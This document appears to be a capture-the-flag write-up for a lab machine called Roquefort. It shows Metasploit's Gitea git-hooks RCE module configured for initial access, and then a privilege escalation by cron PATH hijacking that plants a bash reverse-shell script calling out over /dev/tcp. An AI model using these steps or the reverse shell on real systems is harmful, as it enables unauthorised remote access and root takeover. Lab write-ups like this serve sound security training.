# Roquefort

### Enumeration

```
3000/tcp open   ppp?
```

[https://github.com/go-gitea/gitea/releases/tag/v1.7.5](https://github.com/go-gitea/gitea/releases/tag/v1.7.5)

Created a user.

`msf6 exploit(multi/http/gitea_git_hooks_rce)`

### Initial Access

```
msf6 exploit(multi/http/gitea_git_hooks_rce) > options 

Module options (exploit/multi/http/gitea_git_hooks_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   password123      yes       Password to use
   Proxies                     no        A proxy chain of format type:host:port[,t
                                         ype:host:port][...]
   RHOSTS     192.168.246.67   yes       The target host(s), see https://github.co
                                         m/rapid7/metasploit-framework/wiki/Using-
                                         Metasploit
   RPORT      3000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connection
                                         s
   SSLCert                     no        Path to a custom SSL certificate (default
                                          is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default
                                         is random)
   USERNAME   test             yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.49.246   yes       The listen address (an interface may be speci
                                     fied)
   LPORT  3000             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper
```

### PrivEsc

Writable PATH -> `/usr/local/bin`

```
Writable PATH -> /usr/local/bin

chloe@roquefort:/$ cat /etc/crontab
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

Relative path usage in crontab. -> run-parts

Save these contents as run-parts in /usr/local/bin and make it executable

```
#!/bin/bash

0<&196;exec 196<>/dev/tcp/192.168.49.95/21; /bin/bash <&196 >&196 2>&196
```
